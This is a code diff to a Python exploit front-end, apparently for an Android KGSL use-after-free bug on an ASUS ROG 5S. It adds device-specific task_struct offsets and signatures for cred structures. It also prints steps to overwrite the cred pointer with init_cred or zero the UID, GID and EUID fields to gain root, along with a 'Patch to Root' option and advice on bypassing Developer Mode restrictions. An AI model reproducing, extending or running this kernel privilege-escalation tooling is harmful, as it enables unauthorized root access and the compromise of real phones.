@@ -29,6 +29,7 @@ class MemoryExplorerAI:
         self.uaf_start = 0x7001ff000
         self.uaf_size = 0x10000000
         
+        # AI Knowledge Base
         self.system_apps = {
             "com.android.settings": "Settings / Developer Mode",
             "com.android.systemui": "System UI / Status Bar",
@@ -37,16 +38,30 @@ class MemoryExplorerAI:
             "com.android.contacts": "Contacts / Phonebook",
             "com.android.gallery3d": "Gallery / Camera",
             "com.android.vending": "Google Play Store",
-            "ru.rustore.sdk": "RuStore Application",
+            "com.google.android.gms": "Google Play Services",
+            "com.asus.launcher": "ASUS Launcher",
             "system_server": "Kernel System Server (Core)",
             "surfaceflinger": "Display Compositor",
         }
+        
         self.kernel_structures = {
-            b"KETO0422": "task_struct (Process Marker)",
-            b"selinux_enforcing": "SELinux Enforcing Bit",
+            b"KETO0422": "task_struct (Exploit Marker)",
+            b"\x63\x6F\x6D\x2E\x61\x6E\x64\x72\x6F\x69\x64": "Android Package Name",
+            b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue",
             b"init_cred": "Root Credentials Structure",
             b"\x7fELF": "Kernel ELF Header (Base)",
+            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00": "potential cred struct"
         }
+
+    def get_ram_usage(self):
+        try:
+            with open('/proc/meminfo', 'r') as f:
+                lines = f.readlines()
+                total = int(lines[0].split()[1])
+                available = int(lines[2].split()[1])
+                return 100.0 * (1 - (available / total))
+        except:
+            return 0.0
 
     def read_page(self, va):
         try:
@@ -110,10 +125,27 @@ class MemoryExplorerAI:
 
     def render_tui(self):
         os.system('clear')
+        ram = self.get_ram_usage()
         print("="*75)
         print(" KGSL MEMORY EXPLORER & AI CLASSIFIER (ROG 5S Optimized)")
-        print(f" Status: {'EXPLOIT ACTIVE' if self.exploit_proc else 'IDLE'} | Sprays: {len(self.spray_procs)}")
+        print(f" Status: {'EXPLOIT ACTIVE' if self.exploit_proc else 'IDLE'} | Sprays: {len(self.spray_procs)} | RAM: {ram:.1f}%")
         print("="*75)
+        
+        # Memory Map Visualization
+        print("UAF MEMORY MAP:")
+        map_size = 50
+        progress = 0
+        if self.found_items:
+            # Simple visualization of where items are found in the 256MB range
+            for i in range(map_size):
+                chunk_start = self.uaf_start + (i * (self.uaf_size // map_size))
+                chunk_end = chunk_start + (self.uaf_size // map_size)
+                found = any(chunk_start <= int(item['va'], 16) < chunk_end for item in self.found_items)
+                print("█" if found else "░", end="")
+        else:
+            print("░" * map_size)
+        print("\n" + "-" * 75)
+        
         print(f"{'ID':<3} | {'TYPE':<15} | {'DESCRIPTION':<35} | {'VA ADDRESS':<12}")
         print("-" * 75)
         
@@ -226,13 +258,25 @@ class MemoryExplorerAI:
         if "Settings" in item['description']:
             print(">> [Logic]: System Settings process detected. Contains runtime configuration.")
             print(">> [Advice]: Useful for bypassing 'Developer Mode' or 'USB Debugging' restrictions.")
-        elif "UID 1000" in item['description']:
+        elif "UID 1000" in item['description'] or "System UID" in item['description']:
             print(">> [Logic]: Critical System Privilege structure.")
             print(">> [Action]: Zeroing the UID fields here will grant UID 0 (Root) to this process.")
         elif "task_struct" in item['description']:
-            pid = struct.unpack("<I", data[0x650:0x654])[0] if len(data) > 0x654 else 0
+            # Verified offsets for ROG 5S
+            pid_off = 0x548
+            comm_off = 0x718
+            cred_off = 0x770
+            
+            pid = struct.unpack("<I", data[pid_off:pid_off+4])[0] if len(data) > pid_off+4 else 0
+            cred_ptr = struct.unpack("<Q", data[cred_off:cred_off+8])[0] if len(data) > cred_off+8 else 0
+            
             print(f">> [Logic]: Task structure for PID {pid}.")
-            print(">> [Action]: Locate 'cred' pointer at +0x848/0x850 for escalation.")
+            print(f">> [Pointer]: Found 'cred' at task+0x770: {hex(cred_ptr)}")
+            print(">> [Action]: Overwrite this pointer to init_cred or patch the target struct.")
+        elif "cred struct" in item['description']:
+            uid = struct.unpack("<I", data[4:8])[0] if len(data) > 8 else -1
+            print(f">> [Logic]: Credentials structure. Current UID: {uid}")
+            print(">> [Action]: Patch fields +4 (UID), +8 (GID), +12 (EUID) to 0 for root.")
         
         print("-" * 60)
         print("[P] Patch to Root (UID 0)   [Enter] Back")
@@ -316,6 +360,12 @@ class MemoryExplorerAI:
                 
                 try:
                     for line in proc.stdout:
+                        # Real-time RAM monitoring during scan
+                        ram = self.get_ram_usage()
+                        if ram > 70.0:
+                            print(f"\n[!] HIGH RAM DETECTED ({ram:.1f}%). Throttling scan...")
+                            time.sleep(2)
+                            
                         if line.startswith("MATCH:"):
                             va = int(line.split(":")[1], 16)
                             page_data = self.read_page(va)
